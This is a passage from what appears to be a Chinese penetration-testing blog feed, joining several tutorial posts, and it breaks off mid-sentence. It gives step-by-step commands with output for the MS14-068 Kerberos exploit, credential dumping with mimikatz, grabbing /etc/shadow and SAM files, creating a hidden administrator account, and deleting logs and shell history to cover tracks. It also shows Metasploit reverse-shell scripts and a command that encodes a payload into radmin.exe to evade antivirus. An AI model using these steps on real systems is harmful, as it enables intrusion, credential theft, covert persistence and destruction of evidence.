----------------------------------      Microsoft Windows Kerberos - Privilege Es | exploits/windows/remote/35474.py      ------------------------------------------ ---------------------------------  root@kali:~# cp /usr/share/exploitdb/exploits/windows/remote/35474.py .</code></pre></li><li><p>域环境下使用通用工具查看本地密码</p></li></ul><pre><code>  C:\fgdump&gt;PwDump.exe localhost    # 仅是本地密码  C:\&gt;wce-universal.exe    # 结果是域控制器密码  C:\&gt;wce-universal.exe -w      Administrator\LAB:jlcssadmin  C:\Win32&gt;mimikatz.exe  mimikatz # ::  mimikatz # privilege::debug      Privilege &#39;20&#39; OK  mimikatz # kerberos::list  mimikatz # sekurlsa::logonPasswords</code></pre><ul><li>漏洞利用过程</li></ul><pre><code>  1. 首先在 kali 通过脚本生成一个票据文件      # ms14-068.py -u user@lab.com -s userSID -d dc.lab.com      -u 用户名:登录用户名      -s userSID      -d 域控制器名称：在 Win7 计算机名称处查看，不在域控是，可以用IP地址代替  2. 将票据文件拷贝到 win 系统里      # 拷贝 TGT_user1@lab.com.ccache 到windows系统  3. 在 win 系统里使用 mimikatz.exe 完成权限的提升      # mimikatz.exe log &quot;kerberos::ptc TGT_user@lab.com.ccache&quot; exit  # 在 Win7 上使用本地用户登录  # 查看域账号的信息  C:\&gt;net user      \\WIN7-VM 的用户帐户      Administrator            Guest                    John      user1                    user2      命令成功完成。  C:\Win32&gt;whoami.exe /all      [User]     = &quot;LAB\user3&quot;  S-1-5-21-3056505427-3800332898-2304591883-1111  # kali 报错缺少模块  root@kali:~# python 35474.py -u user3@lab.com -s S-1-5-21-3056505427-3800332898-2304591883-1111 -d 172.16.10.132  # 下载安装模块https://github.com/bidord/pykek</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165535193.png" alt="在这里插入图片描述"></p></li></ul><pre><code>     root@kali:~/Desktop/pykek-master# python ms14-068.py -u user3@lab.com -s S-1-5-21-3056505427-3800332898-2304591883-1111 -d 172.16.10.132     Password:        [+] Building AS-REQ for 172.16.10.132... Done!       [+] Sending AS-REQ to 172.16.10.132... Done!       [+] Receiving AS-REP from 172.16.10.132... Done!       [+] Parsing AS-REP from 172.16.10.132... Done!       [+] Building TGS-REQ for 172.16.10.132... Done!       [+] Sending TGS-REQ to 172.16.10.132... Done!       [+] Receiving TGS-REP from 172.16.10.132... Done!       [+] Parsing TGS-REP from 172.16.10.132... Done!       [+] Creating ccache file &#39;TGT_user1@lab.com.ccache&#39;... Done             # 将文件拷贝到 Win7</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165539296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code>     # 在 Win7 下执行     C:\mimikatz\Win32&gt;mimikatz.exe log &quot;kerberos::ptc TGT_user3@lab.com.ccache&quot; exit ![在这里插入图片描述](https://img-blog.csdnimg.cn/2019041316554383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70)     # 如果injecte成功 你有可能获得到了域管理session，那么klist看一下是否有了kerberos Ticket     C:\mimikatz\Win32&gt;klist         当前登录 ID 是 0:0x776bd         缓存的票证: (1)         #0&gt;     客户端: user3 @ LAB.COM             服务器: krbtgt/LAB.COM @ LAB.COM             Kerberos 票证加密类型: RSADSI RC4-HMAC(NT)             票证标志 0x50a00000 -&gt; forwardable proxiable renewable pre_authent             开始时间: 3/4/2018 2:00:45 (本地)             结束时间:   3/4/2018 12:00:44 (本地)             续订时间: 3/11/2018 2:00:44 (本地)             会话密钥类型: RSADSI RC4-HMAC(NT)     C:\mimikatz\Win32&gt;net use \\Win2003.lab.com\admin$         命令成功完成。</code></pre><h5 id="利用-CVE-2012-0056-提升-linux-权限"><a href="#利用-CVE-2012-0056-提升-linux-权限" class="headerlink" title="利用 CVE-2012-0056 提升 linux 权限"></a>利用 CVE-2012-0056 提升 linux 权限</h5><ul><li>是一个关于 /proc/pid/mem 的漏洞</li><li>要求：linux 内核必须大于2.6.39</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165547661.png" alt="在这里插入图片描述"></p><ul><li><p>样例：使用 ubuntu11 系统</p><ul><li><a href="http://old-releases.ubuntu.com/releases/11.10/" target="_blank" rel="noopener">ubuntu11 官网链接（http://old-releases.ubuntu.com/releases/11.10/）</a></li></ul></li><li><p>在 kali 中查询</p><pre><code> root@kali:~# searchsploit 18411     --------------------------- ----------------------------------      Exploit Title             |  Path                                | (/usr/share/exploitdb/)     --------------------------- ----------------------------------     Linux Kernel 2.6.39 &lt; 3.2. | exploits/linux/local/18411.c     --------------------------- ------------------------------- root@kali:~# cp /usr/share/exploitdb/exploits/linux/local/18411.c .</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165552374.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ul><ul><li>下载了 ubuntu11，安装之后 ssh 没办法使用，文件无法导入，故无法演示 ，过程是这样的，使用 kali-1.1.0 演示一下结kali-1.1.0 已经打了这个漏洞的补丁了，故无结果。</li></ul><h3 id="提权——利用配置不当提权"><a href="#提权——利用配置不当提权" class="headerlink" title="提权——利用配置不当提权"></a>提权——利用配置不当提权</h3><ul><li>与漏洞提权相比更常用的方法 <ul><li>企业环境 </li><li>补丁更新的全部已经安装 </li><li>输入变量过滤之外更值得研发关注的安全隐患 </li><li>以system权限启动 </li><li>NTFS权限允许users修改删除 </li></ul></li><li>icacls<ul><li>icacls c:\windows*.exe /save perm /T </li><li>i586-mingw32msvc-gcc -o admin.exe admin.c </li></ul></li><li>Find<ul><li>find / -perm 777 -exec ls -l {} ; </li></ul></li><li>应用系统的配置文件 <ul><li>应用连接数据库的配置文件 </li></ul></li></ul><h5 id="1-NTFS权限允许-users-修改删除"><a href="#1-NTFS权限允许-users-修改删除" class="headerlink" title="1. NTFS权限允许 users 修改删除"></a>1. NTFS权限允许 users 修改删除</h5><p><img src="https://img-blog.csdnimg.cn/20190413165618902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20190413165622194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>icacls 在 win2003 及以后的版本中存在，可以拷贝到 WinXP 中</li></ul><pre><code> C:\&gt;icacls boot.ini     boot.ini BUILTIN\Power Users:(RX)              BUILTIN\Administrators:(F)              NT AUTHORITY\SYSTEM:(F)     Successfully processed 1 files; Failed processing 0 files # 如果 user 用户拥有 F（FULL）权限，则可以直接控制系统 # 查询各程序的权限情况 C:\&gt;icacls c:\windows\*.exe /save saveicacls /T</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165627275.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code> BU：build user PU：power user BA：build administrator 如果 BU 是 F 的话，则说明可以替换 如果出现 FA；；；BU，则说明权限配置不当 # kali 下使用 c 文件生成 winXP 下的可执行程序 root@kali:~# i686-w64-mingw32-gcc -o admin.exe admin.c</code></pre><h5 id="2-linux-下查看权限"><a href="#2-linux-下查看权限" class="headerlink" title="2.linux 下查看权限"></a>2.linux 下查看权限</h5><pre><code>root@kali:~# ls -lfind / -perm 777 -exec ls -l {} \;</code></pre><h5 id="3-应用系统的配置文件"><a href="#3-应用系统的配置文件" class="headerlink" title="3.应用系统的配置文件"></a>3.应用系统的配置文件</h5><pre><code>1. 应用连接数据库的配置文件2. 后台服务运行账号</code></pre><h3 id="收集敏感信息"><a href="#收集敏感信息" class="headerlink" title="收集敏感信息"></a>收集敏感信息</h3><h5 id="1-提权之后收集基本信息"><a href="#1-提权之后收集基本信息" class="headerlink" title="1. 提权之后收集基本信息"></a>1. 提权之后收集基本信息</h5><pre><code># Linux•/etc/resolv.conf•/etc/passwd•/etc/shadow•whoami and who –a•ifconfig -a, iptables -L -n, ifconfig –a, netstat –r•uname –a, ps aux•dpkg -l| head# Windows•ipconfig /all , ipconfig /displaydns, netstat -bnao , netstat –r•net view , net view /domain    # 查共享信息•net user /domain, net user %username% /domain  # 查域信息•net accounts, net share•net localgroup administrators username /add•net group &quot;Domain Controllers&quot; /domain•net share name$=C:\ /unlimited    # 把 C盘共享出来•net user username /active:yes /domain  # 域管理员重新启动被锁定账号</code></pre><h5 id="2-WMIC-WINDOWS-MANAGEMENT-INSTRUMENTATION"><a href="#2-WMIC-WINDOWS-MANAGEMENT-INSTRUMENTATION" class="headerlink" title="2. WMIC(WINDOWS MANAGEMENT INSTRUMENTATION)"></a>2. WMIC(WINDOWS MANAGEMENT INSTRUMENTATION)</h5><pre><code>C:\Users\John&gt;wmicwmic:root\cli&gt;/?[global switches] &lt;command&gt;有效的全局开关有:/NAMESPACE           别名使用的名称空间路径。/ROLE                包含此别名定义的角色路径。/NODE                别名使用的服务器。/IMPLEVEL            客户模拟级别。/AUTHLEVEL           客户身份验证级别。/LOCALE              客户应用的语言识别符。/PRIVILEGES          启用或禁用所有特权。/TRACE               将调试信息输出到 stderr。/RECORD              将所有输入命令和输出写入日志。/INTERACTIVE         设置或重设交互模式。/FAILFAST            设置或重置 FailFast 模式。/USER                会话期间使用的用户。/PASSWORD            用于会话登录的密码。/OUTPUT              为输出重新定向指定模式。/APPEND              为输出重新定向指定模式。/AGGREGATE           设置或重置集合模式。/AUTHORITY           Specifies the &lt;authority type&gt; for the connection./?[:&lt;BRIEF|FULL&gt;]    用法信息。•wmic nicconfig get ipaddress,macaddress•wmic computersystem get username•wmic netlogin get name,lastlogon•wmic process get caption, executablepath,commandline   # 提取软件安装信息•wmic process where name=“calc.exe&quot; call terminate  # 结束进程•wmic os get name,servicepackmajorversion       #提取操作系统的补丁版本•wmic product get name,version                  # 提取软件信息•wmic product where name=“name” call uninstall /nointeractive   # 静默删除•wmic share get /ALL                            # 提取共享文件夹•wmic /node:&quot;machinename&quot; path Win32_TerminalServiceSetting where  AllowTSConnections=&quot;0&quot; call SetAllowTSConnections &quot;1&quot;    # 开远程桌面•wmic nteventlog get path,filename, writeable   #查看日志目录C:\&gt;wmic nteventlog get path,filename, writeableFileName   Path                       Writeableappevent   \windows\system32\config\  TRUEntds       \windows\system32\config\  TRUEdnsevent   \windows\system32\config\  TRUEntfrs      \windows\system32\config\  TRUEsecevent   \windows\system32\config\  TRUEsysevent   \windows\system32\config\  TRUEThinPrint  \windows\system32\config\  TRUE</code></pre><h5 id="3-收集敏感信息"><a href="#3-收集敏感信息" class="headerlink" title="3. 收集敏感信息"></a>3. 收集敏感信息</h5><pre><code># Linux•/etc ；/usr/local/etc•/etc/passwd ；/etc/shadow•.ssh ；.gnupg 公私钥•The e-mail and data files•业务数据库 ；身份认证服务器数据库•/tmp# windows•SAM 数据库 ； 注册表文件•%SYSTEMROOT%\repair\SAM•%SYSTEMROOT%\System32\config\RegBack\SAM•业务数据库； 身份认证数据库•临时文件目录•UserProfile\AppData\Local\Microsoft\Windows\Temporary Internet Files\</code></pre><h3 id="清除渗透攻击痕迹"><a href="#清除渗透攻击痕迹" class="headerlink" title="清除渗透攻击痕迹"></a>清除渗透攻击痕迹</h3><ul><li>最多也只是清除本地记录，如果有日志服务器的话还是会被记录下所有操作</li><li>windows 系统</li></ul><pre><code>•禁止在登陆界面显示新建账号•REG ADD &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersio\WinLogon\SpecialAccounts\UserList&quot; /v uname /T REG_DWORD /D 0•del %WINDIR%\*.log /a/s/q/f•History•日志•auth.log / secure•btmp / wtmp•lastlog / faillog•其他日志和 HIDS 等# 控制系统之后，新建账号并添加管理员组C:\&gt;net user user4 123456 /add命令成功完成。C:\&gt;net localgroup administrators user4 /add命令成功完成。# 这样开机登录的界面会显示这个账户# 可以通过添加注册表来隐藏REG ADD &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon\SpecialAccounts\UserList&quot; /v user4 /T REG_DWORD /D 0C:\&gt;REG ADD &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon\SpecialAccounts\UserList&quot; /v user4 /T REG_DWORD /D 0操作成功结束# 但是使用 net user 还是可以查看到这个账户# 强制静默删除日志C:\&gt;del %WINDIR%\*.log /a/s/q/f</code></pre><ul><li>Linux 系统</li></ul><pre><code>root@kali:~# history# history 记录保存在 .bash_historyroot@kali:~# ls -l .bash_history     -rw------- 1 root root 15418 3月   4 00:28 .bash_history# 擦除痕迹root@kali:~# history -croot@kali:~# lsattr    --------------e---- ./Downloads    --------------e---- ./Desktop    --------------e---- ./testDir    --------------e---- ./Pictures    --------------e---- ./Public    --------------e---- ./vmware-tools-patches    --------------e---- ./Videos    --------------e---- ./Documents    --------------e---- ./Music    --------------e---- ./Templatesroot@kali:~# chattr -h    Usage: chattr [-pRVf] [-+=aAcCdDeijPsStTu] [-v version] files...# 修改文件属性让其无法被写入数据root@kali:~# touch 456.txtroot@kali:~# lsattr 456.txt     --------------e---- 456.txtroot@kali:~# ifconfig &gt; 456.txt root@kali:~# chattr +i 456.txt root@kali:~# lsattr 456.txt     ----i---------e---- 456.txtroot@kali:~# ifconfig &gt; 456.txt     -bash: 456.txt: 不允许的操作# 修改 .bash_history，让其无法被写入，会变成只读文件root@kali:~# chattr +i .bash_history# 日志记录•auth.log / secure•btmp / wtmp•lastlog / faillogroot@kali:~# cat /var/log/auth.logroot@kali:~# cat /var/log/wtmproot@kali:~# lastlog    用户名           端口     来自             最后登陆时间    root             pts/3    172.16.10.1      日 3月  4 02:30:00 -0500 2018    daemon                                     **从未登录过**    bin                                        **从未登录过**    sys                                        **从未登录过**    sync                                       **从未登录过**    games                                      **从未登录过**    man                                        **从未登录过**    lp                                         **从未登录过**    mail                                       **从未登录过**    news                                       **从未登录过**    uucp                                       **从未登录过**    proxy                                      **从未登录过**    www-data                                   **从未登录过**    backup                                     **从未登录过**    list                                       **从未登录过**    irc                                        **从未登录过**    gnats                                      **从未登录过**    nobody                                     **从未登录过**</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试——拒绝服务</title>
      <link href="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/"/>
      <url>/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试——Mestasploit基本使用</title>
      <link href="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/"/>
      <url>/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/</url>
      
        <content type="html"><![CDATA[<h2 id="渗透测试——Mestasploit-基本使用"><a href="#渗透测试——Mestasploit-基本使用" class="headerlink" title="渗透测试——Mestasploit 基本使用"></a>渗透测试——Mestasploit 基本使用</h2><h5 id="渗透测试者的困扰"><a href="#渗透测试者的困扰" class="headerlink" title="渗透测试者的困扰"></a>渗透测试者的困扰</h5><ul><li>需要掌握数百个工具软件，上千个命令参数，实在记不住</li><li>新出现的漏洞 PoC/EXP 有不同的运行环境要求，准备工作繁琐</li><li>大部分时间都在学习不同工具的使用户环境，如果能统一就好了</li></ul><h5 id="Metasploit-简介"><a href="#Metasploit-简介" class="headerlink" title="Metasploit 简介"></a>Metasploit 简介</h5><ul><li><p>目前最流行、最强大、最具扩展性的渗透测试平台软件</p></li><li><p>基于 Metasploit 进行渗透测试和漏洞分析的流程和方法</p></li><li><p>2003 年由 HD More 发布第一版，2007 年用 ruby 语言编写</p><ul><li>框架继承了渗透测试标准（PETS）标准</li><li>一定程度上统一了渗透测试研究的工作环境</li><li>新的攻击代码可以比较容易的加入框架</li></ul></li><li><p>开发活跃版本更新频繁</p><ul><li>早期版本基于社区力量维护，被 Rapid 7 收购后大枣出其商业版本产品</li><li>目前分化为四个版本，社区版依然十分活跃</li><li>HD More说：为 Metasploit 写书是种自虐</li></ul></li><li><p>Metasploit 默认集成 kali linux 中</p></li><li><p>使用 postgresql 数据库存储数据</p><ul><li>早期版本需要先启动数据库再启动 msf</li></ul><p><img src="https://i.imgur.com/zXzemZd.png" alt="img"></p></li></ul><p><img src="https://i.imgur.com/mgJH3KP.jpg" alt="img"></p><h4 id="Metasploit-架构"><a href="#Metasploit-架构" class="headerlink" title="Metasploit 架构"></a>Metasploit 架构</h4><ul><li>Rex<ul><li>基本功能库，用于完成日常基本任务，无需人工手动编码实现</li><li>处理 socket 连接与访问、协议应答（http/SSL/SMB 等）</li><li>编码转换（XOR、Base64、Unicode）</li></ul></li><li>Msf::Core<ul><li>提供 Metasploit的核心基本 API，是框架的核心能力实现库</li></ul></li><li>Msf::Base<ul><li>提供友好的的 API 接口，便于模块调用的库</li></ul></li><li>Plugin 插件<ul><li>连接和调用外部扩展功能和系统</li></ul></li><li>模块<ul><li>/usr/share/metasploit-framework/modules/</li></ul></li><li>技术功能模块（不是流程模块）<ul><li>Exploits：利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动）</li></ul></li><li>Payload：成功 exploit 之后，真正在目标系统执行的代码或指令<ul><li>shellcode 或系统命令</li><li>三种 payload：/usr/share/metasploit-framework/modules/payloads/</li><li>Single：all-in-one</li><li>Stager：目标计算机内存有限时，先传输一个较小的 payload 用于建立连接</li><li>stages：利用 stager 建立的连接下载的后续payload</li><li>stager、stages 都有多种类型，适用于不同场景</li><li>shellcode 是 payload 的一种，由于期间里正向/反向 shell 而得名</li></ul></li><li>技术功能模块（不是流程模块）<ul><li>Auxiliary：执行信息收集、枚举、指纹探测、扫描等功能的辅助模块（没有 payload 的 exploit 模块）</li><li>Encoders：对 payload 进行加密，躲避 AV 检查的模块</li><li>Nops：提高 paylaod 稳定性及维持大小</li></ul></li></ul><h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><ul><li>使用前先升级：<strong>msfupdate</strong></li><li>msfcli 使用接口，现在已经更新至 msfconsole -x</li><li>msfconsole 使用接口<ul><li>最流行的用户接口</li><li>几乎可以使用全部 msf 功能</li><li>控制台命令支持 TAB 自动补全</li><li>支持外部命令的执行（系统命令等）</li></ul></li><li>点击鼠标启动</li></ul><pre><code>通用选项:    -E, --environment ENVIRONMENT    设置Rails环境，默认为RAIL_ENV环境变量或&#39;生产&#39;数据库选项:    -M, --migration-path DIRECTORY   指定包含其他数据库迁移的目录    -n, --no-database                禁用数据库支持    -y, --yaml PATH                  指定一个包含数据库设置的YAML文件框架选项:    -c FILE                          加载指定的配置文件    -v, -V, --version                显示版本模块选项:        --defer-module-loads         除非明确询问，否则推迟模块加载    -m, --module-path DIRECTORY      加载一个额外的模块路径控制台选项:    -a, --ask                        在退出Metasploit之前询问或接受&#39;退出-y&#39;    -H, --history-file FILE          将命令历史记录保存到指定的文件    -L, --real-readline              使用系统Readline库而不是RbReadline    -o, --output FILE                输出到指定的文件    -p, --plugin PLUGIN              在启动时加载插件    -q, --quiet                      不要在启动时显示 banner 信息    -r, --resource FILE              执行指定的资源文件（ - 用于stdin）    -x, --execute-command COMMAND    执行指定的控制台命令（使用;用于倍数）    -h, --help                       显示此消息</code></pre><ul><li>进入 msfconsole，查看帮助信息</li></ul><pre><code>root@kali:~# msfconsolemsf &gt; help核心命令=============    命令            描述    -------       -----------    ?             帮助菜单    banner        显示一个很棒的metasploit横幅    cd            更改当前的工作目录    color         切换高亮显示颜色    connect       连接与主机通信    exit          退出退出控制台    get           获取特定于上下文的变量的值    getg          获取全局变量的值    grep          Grep另一个命令的输出    help          帮助菜单    history       历史显示命令历史    irb           进入irb脚本模式    load          加载一个框架插件    quit          退出控制台    route         路由通过会话路由流量    save          保存保存活动的数据存储    sessions      会话转储会话列表并显示有关会话的信息    set           将特定于上下文的变量设置为一个值    setg          将全局变量设置为一个值    sleep         睡眠在指定的秒数内不执行任何操作    spool         将控制台输出写入文件以及屏幕    threads       线程查看和操作后台线程    unload        卸载卸载框架插件    unset         取消设置取消设置一个或多个特定于上下文的变量    unsetg        取消设置取消设置一个或多个全局变量    version       版本显示框架和控制台库版本号模块命令===============    命令            描述    -------       -----------    advanced      高级显示一个或多个模块的高级选项    back          返回从当前上下文返回    edit          编辑使用首选编辑器编辑当前模块或文件    info          显示有关一个或多个模块的信息    loadpath      加载路径搜索并加载路径中的模块    options       选项显示全局选项或一个或多个模块    popm          将最新的模块从堆栈弹出并使其处于活动状态    previous      将之前加载的模块设置为当前模块    pushm         将活动或模块列表推入模块堆栈    reload_all    重新加载所有定义的模块路径中的所有模块    reload_lib    从指定路径加载库文件    search        搜索搜索模块名称和说明    show          显示给定类型的模块或所有模块    use           使用按名称选择模块工作命令============    命令            描述    -------       -----------    handler       处理程序作为作业启动负载处理程序    jobs          作业显示和管理作业    kill          杀死一份工作    rename_job    重命名作业资源脚本命令========================    命令            描述    -------       -----------    makerc        保存从开始到文件输入的命令    resource      运行存储在文件中的命令数据库后端命令=========================    命令                描述    -------           -----------    db_connect        连接到现有的数据库    db_disconnect     断开当前数据库实例    db_export         导出包含数据库内容的文件    db_import         导入扫描结果文件（文件类型将被自动检测）    db_nmap           执行nmap并自动记录输出    db_rebuild_cache  重建数据库存储的模块缓存    db_status         显示当前的数据库状态    hosts             列出数据库中的所有主机    loot              列出数据库中的所有战利品    notes             列出数据库中的所有注释    services          列出数据库中的所有服务    vulns             列出数据库中的所有漏洞    workspace         在数据库工作区之间切换凭证后端命令============================    命令            描述    -------       -----------    creds         列出数据库中的所有凭据(密码)</code></pre><ul><li>msf &gt; help show</li></ul><pre><code>[*]“show” 命令的有效参数是：all, encoders, nops, exploits, payloads, auxiliary, plugins, info, options[*]其他特定于模块的参数是：missing, advanced, evasion, targets, actions</code></pre><ul><li>msf &gt; help search</li></ul><pre><code>用法: search [keywords]Keywords:  app       :  客户端或服务器攻击的模块  author    :  本作者编写的模块  bid       :  具有匹配的Bugtraq ID的模块  cve       :  具有匹配CVE ID的模块  edb       :  具有匹配的Exploit-DB ID的模块  name      :  具有匹配描述性名称的模块  platform  :  影响这个平台的模块  ref       :  具有匹配参考的模块  type      :  特定类型的模块（exploit，auxiliary或post）msf &gt; search ms08-067msf &gt; search name:mysql / type:aux /author:aaron    # 可多条件同时搜索</code></pre><ul><li>模块内命令</li></ul><pre><code>msf &gt; search ms09_001_writemsf &gt; use auxiliary/dos/windows/smb/ms09_001_writemsf auxiliary(dos/windows/smb/ms09_001_write) &gt; info[*]其他特定于模块的参数是：missing, advanced, evasion, targets, actionsmsf auxiliary(dos/windows/smb/ms09_001_write) &gt; show missingmsf auxiliary(dos/windows/smb/ms09_001_write) &gt; show advancedmsf auxiliary(dos/windows/smb/ms09_001_write) &gt; show targetsmsf auxiliary(dos/windows/smb/ms09_001_write) &gt; help edit    用法：编辑[file / to / edit.rb]    使用编辑当前活动模块或本地文件。    如果指定了文件路径，它将在编辑后自动重新加载。    否则，您可以使用“重新加载”或“重新运行”来重新加载活动模块。msf auxiliary(dos/windows/smb/ms09_001_write) &gt; edit</code></pre><ul><li>数据库操作</li></ul><pre><code>msf &gt; help db_connect     [*]    Usage: db_connect &lt;user:pass&gt;@&lt;host:port&gt;/&lt;database&gt;    [*]       OR: db_connect -y [path/to/database.yml]    [*] Examples:    [*]        db_connect user@metasploit3    [*]        db_connect user:pass@192.168.0.2/metasploit3    [*]        db_connect user:pass@192.168.0.2:1500/metasploit3msf &gt; help db_import    Usage: db_import &lt;filename&gt; [file2...]    Filenames can be globs like *.xml, or **/*.xml which will search recursivelymsf &gt; help db_export    Usage:    db_export -f &lt;format&gt; [filename]    Format can be one of: xml, pwdump</code></pre><ul><li>msf &gt; help sessions<br>Usage: sessions [options] or sessions [id]</li></ul><pre><code>活动的会话操作和交互。选项:    -C &lt;opt&gt;  在-i或全部给定的会话上运行Meterpreter命令    -K        终止所有会话    -S &lt;opt&gt;  行搜索过滤器。    -c &lt;opt&gt;  在-i或全部给定的会话上运行命令    -h        帮助横幅    -i &lt;opt&gt;  与提供的会话ID进行交互    -k &lt;opt&gt;  按会话ID和/或范围终止会话    -l        列出所有活动会话    -n &lt;opt&gt;  按ID命名或重命名会话    -q        静音模式    -r        重置用-i或全部给定的会话的环形缓冲区    -s &lt;opt&gt;  在-i或全部给定的会话上运行脚本或模块    -t &lt;opt&gt;  设置响应超时（默认值：15）    -u &lt;opt&gt;  在许多平台上将shell升级到meterpreter会话    -v        以详细模式列出会话    -x        在会话表中显示扩展信息许多选项允许使用逗号和破折号指定会话范围。例如:  sessions -s checkvm -i 1,3-5  or  sessions -k 1-2,5,6</code></pre><h4 id="5-Exploit-模块"><a href="#5-Exploit-模块" class="headerlink" title="5. Exploit 模块"></a>5. Exploit 模块</h4><h5 id="1-Active-exploit"><a href="#1-Active-exploit" class="headerlink" title="1.Active exploit"></a>1.Active exploit</h5><p>攻击者主动连接受害者：</p><pre><code>root@kali:~# cat ms08067.rb use exploit/windows/smb/ms08_067_netapiset RHOST 10.10.10.147set RPORT 445set PAYLOAD windows/shell/reverse_tcpset LHOST 10.10.10.131set LPORT 4444exploit</code></pre><p><img src="https://i.imgur.com/rNO4Mud.png" alt="img"></p><pre><code>root@kali:~# cat psexec.rb use exploit/windows/smb/psexecset RHOST 10.10.10.148set PAYLOAD windows/shell/reverse_tcpset LHOST 10.10.10.131set LPORT 4444set SMBUSER Administratorset SMBPASS 123456exploit</code></pre><p><img src="https://i.imgur.com/ctvHDYR.png" alt="img"></p><h5 id="2-Passive-Exploits"><a href="#2-Passive-Exploits" class="headerlink" title="2. Passive Exploits"></a>2. Passive Exploits</h5><p>攻击者等待受害者来触发连接，反弹到攻击者</p><pre><code>root@kali:~# cat ms07017.rb use exploit/windows/browser/ms07_017_ani_loadimage_chunksizeset URIPATH /set SRVHOST 0.0.0.0set PAYLOAD windows/shell/reverse_tcpset EXITFUNC threadset LHOST 10.10.10.131set LPORT 4444exploit</code></pre><p><img src="https://i.imgur.com/meKMAdB.png" alt="img"></p><p><img src="https://i.imgur.com/aEu1anZ.png" alt="img"></p><h4 id="6-生成payload"><a href="#6-生成payload" class="headerlink" title="6.生成payload"></a>6.生成payload</h4><ul><li>用法</li></ul><pre><code>msf &gt; search ms08-067msf &gt; use payload/windows/shell/bind_tcpmsf payload(windows/shell/bind_tcp) &gt; generate  #获得shellcodemsf payload(windows/shell/bind_tcp) &gt; generate -h    Usage: generate [options]    Generates a payload.    OPTIONS:        -E        强制编码。        -b &lt;opt&gt;  要避免的字符列表：&#39;\ x00 \ xff&#39;        -e &lt;opt&gt;  要使用的编码器模块的名称。        -f &lt;opt&gt;  输出文件名（否则为stdout）        -h        帮助横幅。        -i &lt;opt&gt;  编码迭代的次数。        -k        保持模板可执行的功能        -o &lt;opt&gt;  以VAR = VAL格式逗号分隔的选项列表。        -p &lt;opt&gt;  输出平台        -s &lt;opt&gt;  NOP sled length.        -t &lt;opt&gt;  输出格式: bash,c,csharp,dw,dword,hex,java,js_be,js_le,num,perl,pl,powershell,ps1,py,python,raw,rb,ruby,sh,vbapplication,vbscript,asp,aspx,aspx-exe,axis2,dll,elf,elf-so,exe,exe-only,exe-service,exe-small,hta-psh,jar,jsp,loop-vbs,macho,msi,msi-nouac,osx-app,psh,psh-cmd,psh-net,psh-reflection,vba,vba-exe,vba-psh,vbs,war        -x &lt;opt&gt;  要使用的可执行模板msf payload(windows/shell/bind_tcp) &gt; generate</code></pre><p><img src="https://i.imgur.com/wEztOAj.png" alt="img"></p><ul><li>自动绕过坏字符</li></ul><pre><code>msf payload(windows/shell/bind_tcp) &gt; generate -b &#39;\x00&#39;msf payload(windows/shell/bind_tcp) &gt; generate -b &#39;\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b&#39;</code></pre><ul><li>手动指定编码模块</li></ul><pre><code>msf payload(windows/shell/bind_tcp) &gt; show encoders</code></pre><p><img src="https://i.imgur.com/siajCwd.png" alt="img"></p><ul><li>注入文件</li></ul><pre><code>msf payload(windows/shell/bind_tcp) &gt; generate -b &#39;\x00&#39; -t exe -e x86/shikata_ga_nai -i 5 -k -x /usr/share/windows-binaries/radmin.exe -f /root/1.exe</code></pre><ul><li><p>NOP：no-operation / Next Operation （无任何操作）</p><ul><li>EIP 返回存储 NOP sled 的任意地址时将递增，最终导致 shellcode 执行</li><li>增加一行 EOP</li></ul><pre><code>msf payload(windows/shell/bind_tcp) &gt; generate -s 14</code></pre></li></ul><h4 id="7-metepreter"><a href="#7-metepreter" class="headerlink" title="7. metepreter"></a>7. metepreter</h4><h5 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h5><ul><li>高级、动态、可扩展的 payload<ul><li>基于 metepreter 上下文利用更多漏洞发起攻击</li><li>后渗透测试阶段一站式操作界面</li></ul></li><li>完全基于内存的 DLL 注入式 payload （不写硬盘）<ul><li>注入合法系统进程并建立 stager</li><li>基于 stager 